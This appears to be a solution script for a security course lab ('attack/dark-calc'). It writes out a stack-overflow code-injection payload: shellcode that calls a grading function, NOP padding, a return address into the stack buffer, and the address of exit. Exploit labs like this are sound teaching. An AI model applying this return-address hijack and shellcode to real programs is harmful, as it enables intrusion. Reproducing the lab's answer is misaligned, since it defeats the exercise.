#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

p64 = lambda x: x.to_bytes(8, "little")

GRADE_EVAL = 0x401A87
EXIT_PLT   = 0x401880
BUF_ADDR   = 0x721000800FD0

shellcode = (
    b"\xbf\x04\x00\x00\x00"
    + b"\x48\xb8" + p64(GRADE_EVAL)
    + b"\xff\xd0"
    + b"\xc3"
)

payload  = shellcode + b"\x90" * (24 - len(shellcode))
payload += p64(BUF_ADDR)
payload += p64(EXIT_PLT)

sys.stdout.buffer.write(payload)
